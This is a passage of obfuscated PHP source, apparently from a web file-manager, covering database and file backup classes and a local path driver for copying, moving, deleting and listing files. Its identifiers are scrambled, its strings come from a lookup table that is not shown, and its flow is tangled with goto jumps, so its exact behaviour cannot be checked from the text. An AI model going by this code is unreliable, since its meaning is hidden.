($B‘¯é·–ÊØ as $Cøãáêµà¸) { if ($b¹ƒ”öÇÑ» >= 7) { break; } $F‚”“¡ËØ[] = $Cøãáêµà¸[$F¯ ‰†îŠ[28]]; $b¹ƒ”öÇÑ»++; } goto B‚¢öÄËƒÀ; aÔù×–ÖàË: $F¯ ‰†îŠ =& $_SERVER[Å¸ş]; $B‘¯é·–ÊØ = Model($F¯ ‰†îŠ[691])->listData(); if (empty($B‘¯é·–ÊØ)) { return; } goto cø·£³È; B‚¢öÄËƒÀ: for ($b¹ƒ”öÇÑ» = 0; $b¹ƒ”öÇÑ» < 12; $b¹ƒ”öÇÑ»++) { $F‚”“¡ËØ[] = date($F¯ ‰†îŠ[708], strtotime("\x2d{$b¹ƒ”öÇÑ»}\x20\155\x6f\156\164\x68\x73")); } $F‚”“¡ËØ = array_unique($F‚”“¡ËØ); foreach ($B‘¯é·–ÊØ as $Cøãáêµà¸) { if (!empty($Cøãáêµà¸[$F¯ ‰†îŠ[28]]) && in_array($Cøãáêµà¸[$F¯ ‰†îŠ[28]], $F‚”“¡ËØ)) { continue; } Model($F¯ ‰†îŠ[691])->remove($Cøãáêµà¸[$F¯ ‰†îŠ[367]]); $c±ÛÃ…›Å = "\x7b\x69\157\72{$dé ¢ë³Íä[$F¯ ‰†îŠ[694]]}\175\x2f\x64\x61\x74\x61\142\141\163\x65\57\x62\141\x63\x6b\165\160\x5f{$Cøãáêµà¸[$F¯ ‰†îŠ[28]]}"; IO::remove($c±ÛÃ…›Å, !1); } goto bôò­ÀÉ; bôò­ÀÉ: } public function db() { goto D´ Œ’¸„; d‘´’‚Œ¿†: return !0; goto F‡‚›ÇÔ¥í; D´ Œ’¸„: $cÔÓˆÉñŠé =& $_SERVER[Å¸ş]; $CÄîÛÉçÁ¸ = self::get(); if ($CÄîÛÉçÁ¸[$cÔÓˆÉñŠé[281]][$cÔÓˆÉñŠé[697]][$cÔÓˆÉñŠé[692]] == $cÔÓˆÉñŠé[83]) { return !0; } goto AÉ½ºµÌõ¢; AÉ½ºµÌõ¢: $C²”›Ú Ì = new BackupDb(); if (!$C²”›Ú Ì->index()) { return !1; } self::set(array($cÔÓˆÉñŠé[709] => 1)); goto d‘´’‚Œ¿†; F‡‚›ÇÔ¥í: } public function dbFile() { goto d´ˆ÷äÂğè; D£¢“­ö†: $Dß¿ê“Şôï = new BackupDbFile(); if (!$Dß¿ê“Şôï->index()) { return !1; } self::set(array($B§‘›Î¤‘[710] => 1)); goto FÍ•‚Ì’“; FÍ•‚Ì’“: return !0; goto c£´¨ŒÈÚ¯; d´ˆ÷äÂğè: $B§‘›Î¤‘ =& $_SERVER[Å¸ş]; $f¨Ø½¶É = self::get(); if ($f¨Ø½¶É[$B§‘›Î¤‘[281]][$B§‘›Î¤‘[700]][$B§‘›Î¤‘[692]] == $B§‘›Î¤‘[83]) { return !0; } goto D£¢“­ö†; c£´¨ŒÈÚ¯: } public function file() { $Cá‚Ñ¨šĞ‚ =& $_SERVER[Å¸ş]; $C­ìš¹Á¢º = self::get(); if ($C­ìš¹Á¢º[$Cá‚Ñ¨šĞ‚[281]][$Cá‚Ñ¨šĞ‚[167]][$Cá‚Ñ¨šĞ‚[692]] == $Cá‚Ñ¨šĞ‚[83]) { return !0; } if (!isset($C­ìš¹Á¢º[$Cá‚Ñ¨šĞ‚[695]]) || $C­ìš¹Á¢º[$Cá‚Ñ¨šĞ‚[695]] == $Cá‚Ñ¨šĞ‚[470]) { $aËƒğÌÕš = new BackupFile(); if (!$aËƒğÌÕš->index()) { return !1; } } self::set(array($Cá‚Ñ¨šĞ‚[711] => 1, $Cá‚Ñ¨šĞ‚[692] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto f–ÓÑ©ì’¸; cÛ’§©Î«ø: mk_dir($DÀˆ—ïóÜ“); $EÒêêáø¾Å = $E°ŞŞµäõ™ = 0; $EÂƒ›ĞÔÈø = $Dßø®¦ä×¶->db()->getTables(); goto Cõ½ßÆÏ­; fÔ·èÆÛ‘Æ: Backup::set($BªØ‚·í”); return !0; goto Dò„ğìØÁ¹; Cõ¾Óõ›Œ: self::$name = $C‡À„ì×İ[$eëÒ×ØÓ×†[28]]; $E¥Ğİ­Î£ = $GLOBALS[$eëÒ×ØÓ×†[6]][$eëÒ×ØÓ×†[17]]; $aßãÕì‚² = $this->_dbType($E¥Ğİ­Î£); goto FÎ˜ã•”÷‘; f–ÓÑ©ì’¸: $eëÒ×ØÓ×† =& $_SERVER[Å¸ş]; $C‡À„ì×İ = Backup::get(); self::$io = $C‡À„ì×İ[$eëÒ×ØÓ×†[694]]; goto Cõ¾Óõ›Œ; Cõ½ßÆÏ­: $EÂƒ›ĞÔÈø = array_diff($EÂƒ›ĞÔÈø, array($eëÒ×ØÓ×†[713], $eëÒ×ØÓ×†[714])); foreach ($EÂƒ›ĞÔÈø as $Cëà…ˆ¶ëÂ) { $EÒêêáø¾Å += $Dßø®¦ä×¶->model($Cëà…ˆ¶ëÂ)->count(); } $f¯¦ŞÚ¬º± = new Task($eëÒ×ØÓ×†[715], $eëÒ×ØÓ×†[716], $EÒêêáø¾Å, LNG($eëÒ×ØÓ×†[717]) . $eëÒ×ØÓ×†[718] . LNG($eëÒ×ØÓ×†[719])); goto f«ÏÄãğ†‡; FÎ˜ã•”÷‘: $Dßø®¦ä×¶ = new DbManage($E¥Ğİ­Î£, $aßãÕì‚²); $DÀˆ—ïóÜ“ = TEMP_FILES . $eëÒ×ØÓ×†[712] . self::$name . $eëÒ×ØÓ×†[8]; del_dir($DÀˆ—ïóÜ“); goto cÛ’§©Î«ø; f«ÏÄãğ†‡: foreach ($EÂƒ›ĞÔÈø as $Cëà…ˆ¶ëÂ) { $bÓºæä…ğÊ = $DÀˆ—ïóÜ“ . $Cëà…ˆ¶ëÂ . $eëÒ×ØÓ×†[720]; $a³ÀÓÊ¦• = null; if ($Cëà…ˆ¶ëÂ == $eëÒ×ØÓ×†[721] && (!isset($C‡À„ì×İ[$eëÒ×ØÓ×†[695]]) || $C‡À„ì×İ[$eëÒ×ØÓ×†[695]] == $eëÒ×ØÓ×†[470])) { $a³ÀÓÊ¦• = self::$io; } $E°ŞŞµäõ™ += $Dßø®¦ä×¶->sqlFromDb($Cëà…ˆ¶ëÂ, $bÓºæä…ğÊ, $f¯¦ŞÚ¬º±, $a³ÀÓÊ¦•); } $f¯¦ŞÚ¬º±->end(); $BªØ‚·í” = array($eëÒ×ØÓ×†[722] => $aßãÕì‚², $eëÒ×ØÓ×†[709] => 1, $eëÒ×ØÓ×†[723] => $E°ŞŞµäõ™, $eëÒ×ØÓ×†[724] => $E°ŞŞµäõ™); goto fÔ·èÆÛ‘Æ; Dò„ğìØÁ¹: } private function _dbType($AÌİ×æœ) { goto AåÂÊ‰»‰‡; dçÛ›âˆ¿¿: return $EƒÚÆº˜; goto fØùÈƒƒœõ; AåÂÊ‰»‰‡: $D•Öšˆ™¬ª =& $_SERVER[Å¸ş]; $AÌİ×æœ = array_change_key_case($AÌİ×æœ); $EƒÚÆº˜ = $AÌİ×æœ[$D•Öšˆ™¬ª[725]]; goto fòÀêí³³â; fòÀêí³³â: if ($EƒÚÆº˜ == $D•Öšˆ™¬ª[726]) { $C×›Áˆ¯ï˜ = explode($D•Öšˆ™¬ª[4], $AÌİ×æœ[$D•Öšˆ™¬ª[727]]); $EƒÚÆº˜ = $C×›Áˆ¯ï˜[0]; } $BĞ©ÊÈ­¬ = array($D•Öšˆ™¬ª[728] => $D•Öšˆ™¬ª[9], $D•Öšˆ™¬ª[729] => $D•Öšˆ™¬ª[730]); if (isset($BĞ©ÊÈ­¬[$EƒÚÆº˜])) { $EƒÚÆº˜ = $BĞ©ÊÈ­¬[$EƒÚÆº˜]; } goto dçÛ›âˆ¿¿; fØùÈƒƒœõ: } } class BackupDbFile { public function __construct() { } public function index() { goto C²ëİÉï°; C²ëİÉï°: $a•êÇè£ë =& $_SERVER[Å¸ş]; $dŞÁÏ’Ş° = Backup::get(); $cõµãªøé¨ = $dŞÁÏ’Ş°[$a•êÇè£ë[28]]; goto f°á…à ²Ø; a‡¯ñÌëŒŒ: $c½¸ù‡±µÜ->end(); Backup::set(array($a•êÇè£ë[736] => $CŞÖ¶éöáç[$a•êÇè£ë[77]])); return !0; goto eØ‡¥˜Ö¯ç; A¥ëïëÃ³ö: Backup::set(array($a•êÇè£ë[733] => $CŞÖ¶éöáç[$a•êÇè£ë[77]])); IO::move($C“àõåõœ, $Bù˜©–µ×ó); $A”÷Ö–´´ = CONTROLLER_DIR . $a•êÇè£ë[734]; goto eÏÂ›éÔ–×; Cœ³„ÉÉ¥: $c½¸ù‡±µÜ = new TaskFileTransfer($a•êÇè£ë[731], $a•êÇè£ë[716], 0, LNG($a•êÇè£ë[717]) . $a•êÇè£ë[412] . LNG($a•êÇè£ë[719]) . $a•êÇè£ë[732]); $c½¸ù‡±µÜ->addPath($C“àõåõœ); $CŞÖ¶éöáç = IO::infoWithChildren($C“àõåõœ); goto A¥ëïëÃ³ö; eÏÂ›éÔ–×: $B´Äñ¨‹¦ˆ = CONTROLLER_DIR . $a•êÇè£ë[735]; IO::copy($A”÷Ö–´´, $Bù˜©–µ×ó . "\x62\x61\x63\153\x75\x70\x5f{$cõµãªøé¨}\57"); IO::copy($B´Äñ¨‹¦ˆ, $Bù˜©–µ×ó . "\142\141\143\153\165\160\137{$cõµãªøé¨}\x2f"); goto a‡¯ñÌëŒŒ; f°á…à ²Ø: $C“àõåõœ = TEMP_FILES . "\142\141\143\153\x75\160\137{$cõµãªøé¨}\57"; $Bù˜©–µ×ó = "\173\x69\x6f\72{$dŞÁÏ’Ş°[$a•êÇè£ë[694]]}\x7d\x2f\144\x61\x74\x61\142\x61\x73\x65\57"; IO::mkdir($Bù˜©–µ×ó . "\142\141\143\153\165\160\137{$cõµãªøé¨}\57"); goto Cœ³„ÉÉ¥; eØ‡¥˜Ö¯ç: } } goto c³’ÑáÊ¨»; Aôµˆ«‘™: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($E‡ó”¾«Á) { if (substr($E‡ó”¾«Á, 0, 2) == $_SERVER[Å¸ş][1153]) { $E‡ó”¾«Á = BASIC_PATH . substr($E‡ó”¾«Á, 2); } return $E‡ó”¾«Á; } public function iconvApp($bß†èÌîÇ¿) { $B–‚•–ø¨¯ =& $_SERVER[Å¸ş]; global $config; return $this->iconvTo($bß†èÌîÇ¿, $config[$B–‚•–ø¨¯[1151]], $config[$B–‚•–ø¨¯[1150]]); } public function iconvSystem($Aóù“éñŸ°) { $aª‡“Ô¶‘İ =& $_SERVER[Å¸ş]; global $config; return $this->iconvTo($Aóù“éñŸ°, $config[$aª‡“Ô¶‘İ[1150]], $config[$aª‡“Ô¶‘İ[1151]]); } public function getPathOuter($CáÒëãÚ³Ô) { goto FæŒØËÜ·; e”ô°‚×Æ¢: $CáÒëãÚ³Ô = KodIO::clear($CáÒëãÚ³Ô); $CáÒëãÚ³Ô = substr($CáÒëãÚ³Ô, strlen($E·ØÇ ƒÛ)); if (empty($this->pathDriver)) { return $CáÒëãÚ³Ô; } goto f‘Ê‡±§½Ü; f‘Ê‡±§½Ü: return $this->pathDriver . $AÓ”ÃºƒŒ¶[8] . ltrim($CáÒëãÚ³Ô, $AÓ”ÃºƒŒ¶[8]); goto fµ¼àÊ„²; FæŒØËÜ·: $AÓ”ÃºƒŒ¶ =& $_SERVER[Å¸ş]; $E·ØÇ ƒÛ = $this->iconvApp($this->pathBase); $CáÒëãÚ³Ô = $this->iconvApp($CáÒëãÚ³Ô); goto bÍ¦…ƒŞ·; bÍ¦…ƒŞ·: if (substr($E·ØÇ ƒÛ, 0, 2) == $AÓ”ÃºƒŒ¶[1153]) { $E·ØÇ ƒÛ = BASIC_PATH . substr($E·ØÇ ƒÛ, 2); } if (substr($CáÒëãÚ³Ô, 0, 2) == $AÓ”ÃºƒŒ¶[1153]) { $CáÒëãÚ³Ô = BASIC_PATH . substr($CáÒëãÚ³Ô, 2); } $E·ØÇ ƒÛ = KodIO::clear($E·ØÇ ƒÛ); goto e”ô°‚×Æ¢; fµ¼àÊ„²: } public function mkfile($F³èÜÍ±ô˜, $eÖ¡Ò©¢Ù = '', $c½Ş¡ÁÇ = REPEAT_RENAME) { $F³èÜÍ±ô˜ = $this->iconvSystem($F³èÜÍ±ô˜); @touch($F³èÜÍ±ô˜); if ($eÖ¡Ò©¢Ù) { file_put_contents($F³èÜÍ±ô˜, $eÖ¡Ò©¢Ù); } return is_file($F³èÜÍ±ô˜) ? $this->getPathOuter($F³èÜÍ±ô˜) : !1; } public function mkdir($F³„ˆùßŠ±, $aÆ¦®´êŸö = REPEAT_SKIP) { $F³„ˆùßŠ± = $this->iconvSystem($F³„ˆùßŠ±); if (is_dir($F³„ˆùßŠ±)) { return $this->getPathOuter($F³„ˆùßŠ±); } @mkdir($F³„ˆùßŠ±, 511, !0); return is_dir($F³„ˆùßŠ±) ? $this->getPathOuter($F³„ˆùßŠ±) : !1; } public function copyFile($AùË¶ëƒĞ, $F°ÈÔä¶ù) { $this->mkdir($this->pathFather($F°ÈÔä¶ù)); $AùË¶ëƒĞ = $this->iconvSystem($AùË¶ëƒĞ); $F°ÈÔä¶ù = $this->iconvSystem($F°ÈÔä¶ù); $c’ùŒ° = @copy($AùË¶ëƒĞ, $F°ÈÔä¶ù); return $c’ùŒ° ? $this->getPathOuter($F°ÈÔä¶ù) : !1; } public function moveFile($DÁ»ï´¤ÁÅ, $eğÔÆàí „) { $this->mkdir($this->pathFather($eğÔÆàí „)); $DÁ»ï´¤ÁÅ = $this->iconvSystem($DÁ»ï´¤ÁÅ); $eğÔÆàí „ = $this->iconvSystem($eğÔÆàí „); $aÇ¢†—Ö œ = intval(@rename($DÁ»ï´¤ÁÅ, $eğÔÆàí „)); if (!$aÇ¢†—Ö œ) { if ($aÇ¢†—Ö œ = intval(@copy($DÁ»ï´¤ÁÅ, $eğÔÆàí „))) { @unlink($DÁ»ï´¤ÁÅ); } } return $aÇ¢†—Ö œ ? $this->getPathOuter($eğÔÆàí „) : !1; } public function delFile($c‘í“¥Ú›) { $c‘í“¥Ú› = $this->iconvSystem($c‘í“¥Ú›); if (!@unlink($c‘í“¥Ú›)) { @chmod($c‘í“¥Ú›, 511); if (!@unlink($c‘í“¥Ú›)) { return !1; } } else { return !0; } } public function delFolder($FÇí öÌ‰) { goto cÑÕÖ–Ò¨–; bÔí»É¢Ğ–: return rmdir($FÇí öÌ‰); goto f¸İ††çéŠ; AÒ¯ÕµìÃ: if (!($FÅ„Õ©ºğ = opendir($FÇí öÌ‰))) { return !1; } while (($f‡Î·Î‹ÅŞ = readdir($FÅ„Õ©ºğ)) !== !1) { if ($f‡Î·Î‹ÅŞ == $aôõĞ§Ä‰[91] || $f‡Î·Î‹ÅŞ == $aôõĞ§Ä‰[1163]) { continue; } $bäéÏ¢‹‡ä = $FÇí öÌ‰ . $aôõĞ§Ä‰[8] . $f‡Î·Î‹ÅŞ; if (is_file($bäéÏ¢‹‡ä) || is_link($bäéÏ¢‹‡ä)) { if (!unlink($bäéÏ¢‹‡ä)) { chmod($bäéÏ¢‹‡ä, 511); if (!unlink($bäéÏ¢‹‡ä)) { return !1; } } } else { if (is_dir($bäéÏ¢‹‡ä)) { chmod($bäéÏ¢‹‡ä, 511); $bäéÏ¢‹‡ä = $this->iconvApp($bäéÏ¢‹‡ä); if (!$this->delFolder($bäéÏ¢‹‡ä)) { return !1; } } } } closedir($FÅ„Õ©ºğ); goto bÔí»É¢Ğ–; cÑÕÖ–Ò¨–: $aôõĞ§Ä‰ =& $_SERVER[Å¸ş]; $FÇí öÌ‰ = $this->iconvSystem($FÇí öÌ‰); if (!is_dir($FÇí öÌ‰)) { return !0; } goto AÒ¯ÕµìÃ; f¸İ††çéŠ: } public function rename($d¥¬ˆ‹óßö, $aïáÜ‰¶…) { goto f¢²£ãê´Á; f¢²£ãê´Á: $Dˆƒ¥£Äğ• =& $_SERVER[Å¸ş]; $f„ì‡Ö¤æ = $this->fileNameAuto($this->pathFather($d¥¬ˆ‹óßö), $aïáÜ‰¶…); $f„ì‡Ö¤æ = $this->iconvSystem($f„ì‡Ö¤æ); goto dõ‘ã¨¡ğ§; f»¦÷’ø¹«: $F¶ºÍµê—‹ = @rename($d¥¬ˆ‹óßö, $f‰Üƒ”£¬); $f‰Üƒ”£¬ = $this->iconvApp($f‰Üƒ”£¬); return $F¶ºÍµê—‹ ? $this->getPathOuter($f‰Üƒ”£¬) : !1; goto B¬êÒª‡´Ú; dõ‘ã¨¡ğ§: $d¥¬ˆ‹óßö = $this->iconvSystem($d¥¬ˆ‹óßö); $d„à÷§ÈÚê = $this->pathFather($d¥¬ˆ‹óßö); $f‰Üƒ”£¬ = rtrim($d„à÷§ÈÚê, $Dˆƒ¥£Äğ•[8]) . $Dˆƒ¥£Äğ•[8] . $f„ì‡Ö¤æ; goto f»¦÷’ø¹«; B¬êÒª‡´Ú: } public function size($Bè¯È¯õ™) { $Bè¯È¯õ™ = $this->iconvSystem($Bè¯È¯õ™); return (double) abs(sprintf($_SERVER[Å¸ş][1165], @filesize($Bè¯È¯õ™))); } public function info($FŞï«ÈËîÉ) { $FŞï«ÈËîÉ = $this->iconvSystem($FŞï«ÈËîÉ); if ($this->isFolder($FŞï«ÈËîÉ)) { return $this->folderInfo($FŞï«ÈËîÉ); } else { if ($this->isFile($FŞï«ÈËîÉ)) { return $this->fileInfo($FŞï«ÈËîÉ); } } return !1; } protected function infoChildren($b™Œ«‡Éø¢, &$a‹¸Ä„Å…, $e£³¤Ôê§ = true) { goto a¨Ø°«ìĞ”; Cº–®ˆ‚¡: closedir($C¼™§Ñáò); goto a³™İ½ò¶§; a¨Ø°«ìĞ”: $cƒ‚àï©¥’ =& $_SERVER[Å¸ş]; check_abort(); $b™Œ«‡Éø¢ = rtrim($b™Œ«‡Éø¢, $cƒ‚àï©¥’[8]) . $cƒ‚àï©¥’[8]; goto c›¦Áé˜Ğ; c›¦Áé˜Ğ: if ($e£³¤Ôê§) { $b™Œ«‡Éø¢ = $this->iconvSystem($b™Œ«‡Éø¢); } if (!($C¼™§Ñáò = @opendir($b™Œ«‡Éø¢))) { return; } while (($fŠ¼¹Š¬»à = readdir($C¼™§Ñáò)) !== !1) { if ($fŠ¼¹Š¬»à == $cƒ‚àï©¥’[91] || $fŠ¼¹Š¬»à == $cƒ‚àï©¥’[1163]) { continue; } $EÜãÊ‡ÛÂÂ = $b™Œ«‡Éø¢ . $fŠ¼¹Š¬»à; if (is_file($EÜãÊ‡ÛÂÂ) || is_link($EÜãÊ‡ÛÂÂ)) { $a‹¸Ä„Å…[$cƒ‚àï©¥’[78]]++; $a‹¸Ä„Å…[$cƒ‚àï©¥’[77]] += (double) abs(sprintf($cƒ‚àï©¥’[1165], @filesize($EÜãÊ‡ÛÂÂ))); } else { if (is_dir($EÜãÊ‡ÛÂÂ)) { $a‹¸Ä„Å…[$cƒ‚àï©¥’[79]]++; $this->infoChildren($EÜãÊ‡ÛÂÂ, $a‹¸Ä„Å…, !1); } } } goto Cº–®ˆ‚¡; a³™İ½ò¶§: } private function folderInfo($e–«½³ª„, $CÇã•·£ÔÜ = false) { $AÎÜ©‚’ =& $_SERVER[Å¸ş]; $e–«½³ª„ = rtrim($e–«½³ª„, $AÎÜ©‚’[8]) . $AÎÜ©‚’[8]; $EîÆ¢µíç’ = $this->iconvApp($this->pathThis($e–«½³ª„)); if ($CÇã•·£ÔÜ) { return array($AÎÜ©‚’[28] => $EîÆ¢µíç’, $AÎÜ©‚’[75] => $this->getPathOuter($e–«½³ª„), $AÎÜ©‚’[29] => $AÎÜ©‚’[76]); } $dêÁ³øÙÀÒ = array($AÎÜ©‚’[28] => $EîÆ¢µíç’, $AÎÜ©‚’[75] => $this->getPathOuter($e–«½³ª„), $AÎÜ©‚’[29] => $AÎÜ©‚’[76], $AÎÜ©‚’[187] => @filectime($e–«½³ª„), $AÎÜ©‚’[107] => @filemtime($e–«½³ª„), $AÎÜ©‚’[1166] => @fileatime($e–«½³ª„), $AÎÜ©‚’[1160] => is_readable($e–«½³ª„), $AÎÜ©‚’[1161] => is_writable($e–«½³ª„), $AÎÜ©‚’[1167] => get_mode($e–«½³ª„)); return $dêÁ³øÙÀÒ; } private function fileInfo($B´Ë¤ĞØ˜†, $e´æˆ®œİ = false) { $b‚´ù÷‘ Ç =& $_SERVER[Å¸ş]; $a’•¿½õåö = $this->iconvApp($this->pathThis($B´Ë¤ĞØ˜†)); if ($e´æˆ®œİ) { return array($b‚´ù÷‘ Ç[28] => $a’•¿½õåö, $b‚´ù÷‘ Ç[75] => $this->getPathOuter($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[29] => $b‚´ù÷‘ Ç[167], $b‚´ù÷‘ Ç[77] => $this->size($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[160] => $this->ext($a’•¿½õåö)); } $fõÉ„éèØŞ = array($b‚´ù÷‘ Ç[28] => $a’•¿½õåö, $b‚´ù÷‘ Ç[75] => $this->getPathOuter($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[29] => $b‚´ù÷‘ Ç[167], $b‚´ù÷‘ Ç[187] => @filectime($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[107] => @filemtime($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[1166] => @fileatime($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[77] => $this->size($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[160] => $this->ext($a’•¿½õåö), $b‚´ù÷‘ Ç[1160] => is_readable($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[1161] => is_writable($B´Ë¤ĞØ˜†), $b‚´ù÷‘ Ç[1167] => get_mode($B´Ë¤ĞØ˜†)); return $fõÉ„éèØŞ; } public function exist($eÚà‚ÖÇ») { $eÚà‚ÖÇ» = $this->iconvSystem($eÚà‚ÖÇ»); return @file_exists($eÚà‚ÖÇ»); } public function isFile($dğÔ…ãÇé») { $dğÔ…ãÇé» = $this->iconvSystem($dğÔ…ãÇé»); return @is_file($dğÔ…ãÇé»); } public function isFolder($b¢§‚óİœ) { $b¢§‚óİœ = $this->iconvSystem($b¢§‚óİœ); return @is_dir($b¢§‚óİœ); } public function listPath($c™¼š¡—, $d‰±‹êœˆ„ = false) { goto f„·•ÏÁ¼å; bŸƒôÓä ë: closedir($BÜƒ‹ƒ·Ô®); return $b¾‰ÄÇ½ò; goto CœëÛË¡ó; CÀœØÊ¿Ü÷: $b¾‰ÄÇ½ò = array($Eº‡òËÙÌ˜[74] => array(), $Eº‡òËÙÌ˜[73] => array()); if (!($BÜƒ‹ƒ·Ô® = @opendir($c™¼š¡—))) { return $b¾‰ÄÇ½ò; } while (($eĞîå›öÙ = readdir($BÜƒ‹ƒ·Ô®)) !== !1) { if ($eĞîå›öÙ == $Eº‡òËÙÌ˜[91] || $eĞîå›öÙ == $Eº‡òËÙÌ˜[1163]) { continue; } $Bñ×‹›Õï© = $c™¼š¡— . $eĞîå›öÙ; if (is_file($Bñ×‹›Õï©)) { $b¾‰ÄÇ½ò[$Eº‡òËÙÌ˜[73]][] = $this->fileInfo($Bñ×‹›Õï©, $d‰±‹êœˆ„); } else { $b¾‰ÄÇ½ò[$Eº‡òËÙÌ˜[74]][] = $this->folderInfo($Bñ×‹›Õï©, $d‰±‹êœˆ„); } } goto bŸƒôÓä ë; f„·•ÏÁ¼å: $Eº‡òËÙÌ˜ =& $_SERVER[Å¸ş]; $c™¼š¡— = $this->iconvSystem($c™¼š¡—); $c™¼š¡— = rtrim($c™¼š¡—, $Eº‡òËÙÌ˜[8]) . $Eº‡òËÙÌ˜[8]; goto CÀœØÊ¿Ü÷; CœëÛË¡ó: } public function listAll($dùÈé±‘£, &$F‰ø´˜îÍ¨ = array()) { goto a§äÑ‚ù±¹; a˜ëƒÜÈ¹: if (!($C«ö¡äÒ = @opendir($dùÈé±‘£))) { return $F‰ø´˜îÍ¨; } while (($a¤´î¯ÔŞÈ = readdir($C«ö¡äÒ)) !== !1) { if ($a¤´î¯ÔŞÈ == $E¦Ñß›œ‚ç[91] || $a¤´î¯ÔŞÈ == $E¦Ñß›œ‚ç[1163]) { continue; } $C˜Ş¢–Õ = $dùÈé±‘£ . $a¤´î¯ÔŞÈ; if (is_dir($C˜Ş¢–Õ) && !is_link($C˜Ş¢–Õ)) { $F‰ø´˜îÍ¨[] = array($E¦Ñß›œ‚ç[75] => $C˜Ş¢–Õ . $E¦Ñß›œ‚ç[8], $E¦Ñß›œ‚ç[76] => 1, $E¦Ñß›œ‚ç[107] => @filemtime($C˜Ş¢–Õ), $E¦Ñß›œ‚ç[77] => 0); $this->listAll($C˜Ş¢–Õ, $F‰ø´˜îÍ¨); } else { $F‰ø´˜îÍ¨[] = array($E¦Ñß›œ‚ç[75] => $C˜Ş¢–Õ, $E¦Ñß›œ‚ç[76] => 0, $E¦Ñß›œ‚ç[107] => @filemtime($C˜Ş¢–Õ), $E¦Ñß›œ‚ç[77] => $this->size($C˜Ş¢–Õ)); } } closedir($C«ö¡äÒ); goto aÕ©ì¨¾; a§äÑ‚ù±¹: $E¦Ñß›œ‚ç =& $_SERVER[Å¸ş]; $dùÈé±‘£ = $this->iconvSystem($dùÈé±‘£); $dùÈé±‘£ = rtrim($dùÈé±‘£, $E¦Ñß›œ‚ç[8]) . $E¦Ñß›œ‚ç[8]; goto a˜ëƒÜÈ¹; aÕ©ì¨¾: return $F‰ø´˜îÍ¨; goto CŸŒô’À™; CŸŒô’À™: } public function has($d„Çá™Õ, $CÅÌ”ùÔ¼ë = false, $EÈÆô‘¸Ä = true) { goto A‡¦±¿Õ“Õ; A‡¦±¿Õ“Õ: $EˆÕ°‡œì» =& $_SERVER[Å¸ş]; $d„Çá™Õ = $this->iconvSystem($d„Çá™Õ); $d„Çá™Õ = rtrim($d„Çá™Õ, $EˆÕ°‡œì»[8]) . $EˆÕ°‡œì»[8]; goto EïÌ‹áÉ; fôœ£¥“˜: if ($CÅÌ”ùÔ¼ë) { return array($EˆÕ°‡œì»[191] => $c³»ƒÆÛ®¯, $EˆÕ°‡œì»[192] => $aõÁ‡´‡ïƒ); } return !1; goto D½ÎÆØğŠ; EïÌ‹áÉ: if (!($BÇ§ªŞ£¼Ç = @opendir($d„Çá™Õ))) { return !1; } $c³»ƒÆÛ®¯ = 0; $aõÁ‡´‡ïƒ = 0; goto fëğÏò‡; fëğÏò‡: $AÍÖÃ«¾¢§ = 0; while (($eÊ—÷áÑÀ = readdir($BÇ§ªŞ£¼Ç)) !== !1) { if ($eÊ—÷áÑÀ == $EˆÕ°‡œì»[91] || $eÊ—÷áÑÀ == $EˆÕ°‡œì»[1163]) { continue; } $a²§•ó—•‡ = $d„Çá™Õ . $eÊ—÷áÑÀ; if ($CÅÌ”ùÔ¼ë) { $AÍÖÃ«¾¢§++; if (@is_file($a²§•ó—•‡)) { $c³»ƒÆÛ®¯++; } else { $aõÁ‡´‡ïƒ++; } if ($AÍÖÃ«¾¢§ > 10000) { break; } continue; } if ($EÈÆô‘¸Ä) { if (@is_file($a²§•ó—•‡)) { return !0; } } else { if (@is_dir($a²§•ó—•‡ . $EˆÕ°‡œì»[8])) { return !0; } } } closedir($BÇ§ªŞ£¼Ç); goto fôœ£¥“˜; D½ÎÆØğŠ: } public function hashSimple($C¾ô„ÒÍ‹†) { goto b¤Úò½¶£Å; b¤Úò½¶£Å: $cçÍÙ¨÷Ì =& $_SERVER[Å¸ş]; if (!$C¾ô„ÒÍ‹†) { return md5($cçÍÙ¨÷Ì[33]); } $C¾ô„ÒÍ‹† = $this->iconvSystem($C¾ô„ÒÍ‹†); goto cœïôùØ›Ï; D‹·¹ªØ“: return md5($c‘¦â«ù—˜) . $B‚µß—¤à‘; goto fÔ©¡À›Ÿ¿; b–¿Í§ƒÅ: $dïŒ«°©ğÎ = fopen($C¾ô„ÒÍ‹†, $cçÍÙ¨÷Ì[1168]); if (!$dïŒ«°©ğÎ) { return $c‘¦â«ù—˜; } for ($B±Ï‘ŞïĞ• = 0; $B±Ï‘ŞïĞ• < $eÕöÁ×²Í†; $B±Ï‘ŞïĞ•++) { fseek($dïŒ«°©ğÎ, $d„¬Ì¸»× * $B±Ï‘ŞïĞ•); $c‘¦â«ù—˜ .= fread($dïŒ«°©ğÎ, $AÛ”£â©©ß); } goto C„ùØ¬ˆ‘§; C„ùØ¬ˆ‘§: fseek($dïŒ«°©ğÎ, $B‚µß—¤à‘ - $AÛ”£â©©ß); $c‘¦â«ù—˜ .= fread($dïŒ«°©ğÎ, $AÛ”£â©©ß); fclose($dïŒ«°©ğÎ); goto D‹·¹ªØ“; cœïôùØ›Ï: $B‚µß—¤à‘ = $this->size($C¾ô„ÒÍ‹†); $AÛ”£â©©ß = 200; $eÕöÁ×²Í† = 50; goto fôŒß¡º™Ø; fôŒß¡º™Ø: if ($B‚µß—¤à‘ <= $AÛ”£â©©ß * $eÕöÁ×²Í†) { return $this->hashMd5($C¾ô„ÒÍ‹†) . $B‚µß—¤à‘; } $c‘¦â«ù—˜ = $cçÍÙ¨÷Ì[33]; $d„¬Ì¸»× = intval($B‚µß—¤à‘ / $eÕöÁ×²Í†); goto b–¿Í§ƒÅ; fÔ©¡À›Ÿ¿: } public function getContent($C‡‹±†Á…) { $C‡‹±†Á… = $this->iconvSystem($C‡‹±†Á…); return file_get_contents($C‡‹±†Á…); } public function setContent($f˜Á„Šµó, $b÷×‡ÔŒÛ‡ = '') { $f˜Á„Šµó = $this->iconvSystem($f˜Á„Šµó); @file_put_contents($f˜Á„Šµó, $b÷×‡ÔŒÛ‡, 